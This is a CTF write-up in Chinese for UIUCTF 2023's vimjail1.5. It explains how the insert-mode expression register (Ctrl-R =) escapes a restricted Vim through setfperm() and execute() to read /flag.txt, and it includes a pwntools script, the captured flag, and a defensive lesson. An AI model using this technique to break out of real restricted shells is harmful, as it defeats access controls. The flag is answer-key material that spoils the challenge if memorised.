# UIUCTF 2023 vimjail1.5 Writeup

## 题目简述

`vimjail1.5` 修补了上一题利用 `Ctrl-\ Ctrl-N` 返回普通模式的路线：配置将整个 `Ctrl-\` 前缀映射为文本 `nope`，同时仍以 `vim -R -M -Z` 启动 restricted Vim 并默认进入插入模式。

修补没有覆盖插入模式表达式寄存器，因此仍可在不切换模式的情况下执行 Vimscript 函数。

## 解题过程

在插入模式按 `Ctrl-R`，再按 `=`，即可进入表达式寄存器求值。先确保 flag 具有读取权限：

```text
Ctrl-R = setfperm('/flag.txt', 'r--r--r--') Enter Enter
```

再利用 `execute()` 执行打开文件的 Ex 命令：

```text
Ctrl-R = execute(':e /flag.txt') Enter Enter
```

自动化时可直接发送对应控制字节：

```python
from pwn import remote

io = remote("vimjail1-5.chal.uiuc.tf", 1337)
io.recvuntil(b"VIM - Vi IMproved")
io.send(b"\x12=setfperm('/flag.txt', 'r--r--r--')\n\n")
io.send(b"\x12=execute(':e /flag.txt')\n\n")
io.recvuntil(b"uiuctf{")
print((b"uiuctf{" + io.recvuntil(b"}")).decode())
```

得到：

```text
uiuctf{ctr1_r_1s_h4ndy_277d0fde079f49d2}
```

## 方法总结

这一版封锁了特定按键序列，却没有封锁具有同等能力的求值入口。Vim 的表达式寄存器本身就是脚本执行面，允许调用 `setfperm()` 和 `execute()` 等有副作用的函数。修补交互式 jail 时应按“能力”枚举所有求值和 I/O 通道，而不是只封禁上一版 payload 使用的按键。
